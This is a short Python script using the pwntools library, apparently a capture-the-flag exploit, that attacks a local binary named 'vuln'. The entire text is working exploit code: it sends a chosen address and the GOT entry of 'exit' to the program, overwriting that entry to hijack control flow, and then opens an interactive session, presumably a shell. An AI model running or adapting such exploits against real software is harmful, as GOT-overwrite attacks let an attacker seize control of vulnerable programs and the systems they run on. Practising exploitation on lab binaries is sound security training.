from pwn import *

p = process('./vuln')
elf = ELF('./vuln')


what = str(0x00000000004012b6)
where = str(elf.got['exit'])

p.sendline(b'Y')
p.sendline(what)
p.sendline(where)
p.interactive()
